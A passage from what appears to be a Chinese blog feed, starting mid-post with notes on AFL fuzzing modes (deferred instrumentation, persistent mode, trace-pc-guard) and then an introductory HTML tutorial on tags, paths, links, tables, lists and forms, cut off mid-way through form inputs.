instrumentation</strong>:<br>AFL会尝试通过只执行一次目标二进制文件来提升性能，在<code> main()</code> 之前暂停程序，然后克隆“主”进程获得一个稳定的可进行持续fuzz的目标。简言之，避免目标二进制文件的多次、重复的完整运行，而是采取了一种类似快照的机制。</p><p>虽然这种机制可以减少程序运行在操作系统、链接器和libc级别的消耗，但是在面对大型配置文件的解析时，优势并不明显。</p><p>在这种情况下，可以将 <code>forkserver</code> 的<strong>初始化放在大部分初始化工作完成之后、二进制文件解析之前</strong>来进行，这在某些情况下可以提升10倍以上的性能。我们把这种方式称为LLVM模式下的 <code>deferred instrumentation</code>。</p><p>首先，在代码中寻找可以进行延迟克隆的合适的、不会破坏原二进制文件的位置，然后添加如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL    __AFL_INIT();#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><strong>persistent mode</strong></p><figure class="highlight plaintext"><figcaption><span>mode``` 并没有通过```fork```子进程的方式来执行fuzz。一些库中提供的API是无状态的，或者可以在处理不同输入文件之间进行重置，恢复到之前的状态。执行此类重置时，可以使用一个长期存活的进程来测试多个用例，以这种方式来减少重复的 ```fork()``` 调用和操作系统的开销。不得不说，这种思路真的很优秀。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs persistent"><br>设计框架如下：<br>设置一个 while 循环，并指定循环次数。在每次循环内，首先读取数据，然后调用想fuzz的库代码，然后重置状态，继续循环。（本质上也是一种快照。）<br><br>对于循环次数的设置，循环次数控制了AFL从头重新启动过程之前的最大迭代次数，较小的循环次数可以降低内存泄漏类故障的影响，官方建议的数值为1000。（循环次数设置过高可能出现较多意料之外的问题，并不建议设置过高。）<br>```c<br>while (__AFL_LOOP(1000)) &#123;  /* Read input data. */  /* Call library code to be fuzzed. */  /* Reset state. */&#125;/* Exit normally */<br></code></pre></td></tr></table></figure><p><strong>trace-pc-guard mode</strong><br>该功能的使用需要设置宏 <code>AFL_TRACE_PC=1 </code>，然后再执行 <code>afl-clang-fast </code>时传入参数<code>-fsanitize-coverage=trace-pc-guard</code>。</p><p>该功能的主要特点是会在每个edge插入桩代码，函数<code>__sanitizer_cov_trace_pc_guard</code>会在每个edge进行调用，该函数利用函数参数 <code>guard </code>指针所指向的 <code>uint32</code> 值来确定共享内存上所对应的地址</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>front</title>
    <link href="/2022/06/30/front/"/>
    <url>/2022/06/30/front/</url>
    
    <content type="html"><![CDATA[<h1 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h1><p>跟着黑马程序员学</p><h2 id="0x01-网页与html"><a href="#0x01-网页与html" class="headerlink" title="0x01 网页与html"></a>0x01 网页与html</h2><div class="code-wrapper"><pre><code class="hljs">html是一种**超文本标记语言**网页是一个html文件，由前端人员书写，浏览器渲染而展现</code></pre></div><h3 id="web标准的组成"><a href="#web标准的组成" class="headerlink" title="web标准的组成"></a>web标准的组成</h3><div class="code-wrapper"><pre><code class="hljs">web主要由结构，表现，行为组成结构：html表现：css（设计外观样式）行为：JavaScript（用于交互）</code></pre></div><h3 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h3><h3 id="html语法规范"><a href="#html语法规范" class="headerlink" title="html语法规范"></a>html语法规范</h3><div class="code-wrapper"><pre><code class="hljs">html标签是用尖括号括起来的关键词有开始标签也有结束标签，结束标签加反斜杠&quot;/&quot;</code></pre></div><p>标签关系<br>包含关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs (html)">&lt;head&gt;<br>      &lt;title&gt; &lt;/title&gt;<br>&lt;/head&gt;<br></code></pre></td></tr></table></figure><p>并列关系</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;head&gt;</span> <span class="hljs-section">&lt;/head&gt;</span><br><span class="hljs-section">&lt;body&gt;</span> <span class="hljs-section">&lt;/body&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第一个页面"><a href="#第一个页面" class="headerlink" title="第一个页面"></a>第一个页面</h3><p>代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>第一个页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    键盘敲烂，工资过万<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果如下<br><img src="/2022/06/30/front/p1.png"><br>可见，head标签负责页面上方的部分，如页面的名字<br><img src="/2022/06/30/front/p2.png"><br>而body则是网站主体内容</p><h3 id="Vscode-利用写代码"><a href="#Vscode-利用写代码" class="headerlink" title="Vscode 利用写代码"></a>Vscode 利用写代码</h3><h3 id="DOCTYPE-以及-lang等字符集作用"><a href="#DOCTYPE-以及-lang等字符集作用" class="headerlink" title="!DOCTYPE 以及 lang等字符集作用"></a>!DOCTYPE 以及 lang等字符集作用</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>意思为，使用的是html语言<br><strong>必须写在文件第一行</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;html lang <span class="hljs-operator">=</span> <span class="hljs-string">&quot;en&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>lang语言种类。<br>1.en定义语言为英语<br>2.zh-CN为中文<br>定义是告诉浏览器，语言种类，定义为en也是可以显示中文的。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>UTF-8是万国码，几乎包含全世界所有国家用到的字符。</p><h3 id="html常用标签"><a href="#html常用标签" class="headerlink" title="html常用标签"></a>html常用标签</h3><p>根据标签语义，在合适的地方给一个最合理的标签，可以让页面结构更清晰。</p><h4 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> - <span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> 我是一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>标签语义：</strong><br>重要的，单列一行的加粗的文字<br>且h1最重要，大于h2，以此类推。一共有六级标题。</p><h4 id="段落和换行标签（重要）"><a href="#段落和换行标签（重要）" class="headerlink" title="段落和换行标签（重要）"></a>段落和换行标签<strong>（重要）</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;p&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是段落标签<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>全部素材、源码、ppt、素材、讲义都在置顶留言,去下载吧~~<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>也可以直接： https://gitee.com/xiaoqiang001/html_css_material.git 下载哈！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>1. web端布局：先讲解HTML5常用标签，接着讲解CSS3常见样式增加的H5C3新特性，新语法，最后讲解<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如此，就能分段。<br><strong>换行标签</strong><br><strong>换行是单标签</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;br /&gt;</span><br></code></pre></td></tr></table></figure><p>br加空格，反斜杠。<br>强制文字换行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>的不同之处在于，段落间有空行，而换行是紧接着下一行开头开始的。<br></code></pre></td></tr></table></figure><h4 id="文本格式化标签"><a href="#文本格式化标签" class="headerlink" title="文本格式化标签"></a>文本格式化标签</h4><p>如<strong>粗体</strong>、<em>斜体</em>、下划线等等</p><p>加粗：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br></code></pre></td></tr></table></figure><p>斜体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>我是倾斜的文字<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>倾斜<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br></code></pre></td></tr></table></figure><p>删除线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs (html)">&lt;del&gt;我是删除线&lt;/del&gt;<br>&lt;s&gt;&lt;/s&gt;<br></code></pre></td></tr></table></figure><p>下划线：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span>我是下划线<span class="hljs-tag">&lt;/<span class="hljs-name">ins</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="div和span标签"><a href="#div和span标签" class="headerlink" title="div和span标签"></a>div和span标签</h4><p>这两个标签是无语义的，是放内容的盒子<br>div是division的缩写，表示分割，分区。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;百度&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;搜狐&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;新浪&lt;/<span class="hljs-selector-tag">span</span>&gt;<br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>百度 搜狐 新浪<br></code></pre></td></tr></table></figure><p>此两个标签一横一竖，用于布局</p><h4 id="图像标签和路径（重点）"><a href="#图像标签和路径（重点）" class="headerlink" title="图像标签和路径（重点）"></a>图像标签和路径（重点）</h4><p>1.图像标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;图像URL&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>src 是img标签的必须属性，它用于指定图像文件的路径和文件名。<br>img是单标签。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">可选参数<br>alt: 当图片显示不出来时，替换用<br><span class="hljs-built_in">title</span>：鼠标浮在图片上时，显示文字<br><span class="hljs-built_in">width</span>：修改图像的宽度<br><span class="hljs-built_in">height</span>：修改图像的高度<br><span class="hljs-built_in">border</span>：设置图像的边框粗细<br></code></pre></td></tr></table></figure><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p>1.相对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">相对路径：<br>以**引用文件所在位置**为参考基础，而建立出的目录路径。<br>简单来说，图片相对于HTML页面的位置。<br>同一级引用：此html文件与引用图片位于同一层<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img.jpg&quot;</span> /&gt;<br>下一级引用：<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;images/img.jpg&quot;</span> /&gt;<br>上一级引用:<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;../img.jpg&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>2.绝对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img的url&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法:<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;跳转目标&quot;</span> <span class="hljs-attr">target</span> = <span class="hljs-string">&quot;窗口弹出方式&quot;</span>&gt;</span>文本或图片<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>外部链接跳转目标格式：<br>http://www.kawatsuki.com<br>需要写http与www.<br>内部链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;gons.html&quot;</span>&gt;</span>gons<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>即可<br>空链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#&quot;</span>&gt;</span>空连接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>显示为链接，但是不指向任何地方<br>下载链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;tar.zip&quot;</span>&gt;</span>下载文件<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>点击链接就会下载<br>锚点链接：快速跳转到本页面某处<br>语法：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>去往某处标题：<br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法<br><span class="hljs-comment">&lt;!-- ..... --&gt;</span><br>如<br><span class="hljs-comment">&lt;!--这是注释--&gt;</span><br>或快捷键：<br>ctrl + /<br>可快速注释<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">特殊字符<br>空格：<br><span class="hljs-meta">&amp;nbsp;</span><br>是一个空格<br><span class="hljs-meta">&amp;lt;</span><br><span class="hljs-meta">&amp;gt;</span><br>分别是小于号（less than）和大于号。<br>以<span class="hljs-meta">&amp;开头以;结尾</span><br></code></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><h4 id="表格的基本语法"><a href="#表格的基本语法" class="headerlink" title="表格的基本语法"></a>表格的基本语法</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">table</span>&gt;<br>    &lt;<span class="hljs-selector-tag">tr</span>&gt;<br>        &lt;<span class="hljs-selector-tag">td</span>&gt;单元格中的文字&lt;/<span class="hljs-selector-tag">td</span>&gt;<br>        ...<br>    &lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>    ...<br>&lt;/<span class="hljs-selector-tag">table</span>&gt;<br><br><span class="hljs-selector-tag">table</span>是用于定义表格的标签<br><span class="hljs-selector-tag">tr</span>是表格中的行<br><span class="hljs-selector-tag">td</span>是<span class="hljs-selector-tag">table</span> data，定义表格中的单元格，必须嵌套在<span class="hljs-selector-tag">tr</span>内<br></code></pre></td></tr></table></figure><h4 id="表头单元格标签"><a href="#表头单元格标签" class="headerlink" title="表头单元格标签"></a>表头单元格标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">用<span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>words<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>代替<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">thead</span>&gt;<br>&lt;/<span class="hljs-selector-tag">thead</span>&gt;<br>可以用此包括第一个&lt;<span class="hljs-selector-tag">tr</span>&gt;&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>表示表头区域<br>&lt;<span class="hljs-selector-tag">tbody</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;/<span class="hljs-selector-tag">tbody</span>&gt;<br><span class="hljs-selector-tag">thead</span>与<span class="hljs-selector-tag">tbody</span>内必须有&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>此两个标签用于分割表头与表体，包含于&lt;<span class="hljs-selector-tag">table</span>&gt;内<br></code></pre></td></tr></table></figure><h4 id="合并单元格"><a href="#合并单元格" class="headerlink" title="合并单元格"></a>合并单元格</h4><p>合并单元格的方式：<br>跨行：rowspan = “合并单元格个数”<br>跨列：colspan = “合并单元格个数”<br>目标单元格：<br>跨行：写于最上侧单元格内。<br>跨列：在左侧单元格内。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">三部曲：<br>1.确定跨行还是跨列<br>2.找到目标单元格 <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;10&quot;</span>&gt;</span>woreds<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>3.删除多余格<br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>1.无序列表</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">语法：<br>&lt;<span class="hljs-selector-tag">ul</span>&gt;<br>    &lt;<span class="hljs-selector-tag">li</span>&gt;<br>    ....<br>    &lt;/<span class="hljs-selector-tag">li</span>&gt;<br>&lt;/<span class="hljs-selector-tag">ul</span>&gt;<br>注意：<br><span class="hljs-selector-tag">ul</span>中，只能放<span class="hljs-selector-tag">li</span>标签<br><span class="hljs-selector-tag">li</span>中，可以放任何标签<br></code></pre></td></tr></table></figure><p>2.有序列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br>有序列表会自动加上1，2，3的样式，即有序。<br></code></pre></td></tr></table></figure><p>3.自定义列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">使用场景：<br>关注我们<br><br>新浪微博<br>官方微信<br>联系我们<br><br><br>这样的列表<br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>名词1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p>如填写注册信息<br>用于收集用户信息。<br>表单的组成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.表单域<br>2.表单元素<br>3.提示信息<br><br></code></pre></td></tr></table></figure><h4 id="表单域"><a href="#表单域" class="headerlink" title="表单域"></a>表单域</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">表单域是一个包含表单元素的区域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>标签用于定义表单域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>会把它范围内的表单元素信息提交给服务器<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;url地址&quot;</span> <span class="hljs-attr">method</span> = <span class="hljs-string">&quot;提交方式&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;表单域名称&quot;</span>&gt;</span><br>....<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="表单控件"><a href="#表单控件" class="headerlink" title="表单控件"></a>表单控件</h4><p>1.input输入表单元素<br>2.select下拉表单元素<br>3.textarea文本域元素</p><p>input:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">input</span>&gt;是单标签，用于收集用户信息。<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;属性值&quot;/&gt;<br>属性值有<br><span class="hljs-type">text</span>（文本）<br><br><br>&lt;form&gt;<br>    用户名：&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;text&quot;/&gt;<br>&lt;/form&gt;<br><br><span class="hljs-keyword">password</span>（密码）<br>输入的是星号，不会泄露<br><br><br>radio（单选）<br>性别：男&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt; 女&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt;<br><span class="hljs-keyword">input</span>内必须有<span class="hljs-type">name</span>元素，且相同，才能达到单选的目的<br><br><br>checkbox（多选）<br>爱好：吃饭&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox&quot;/&gt;  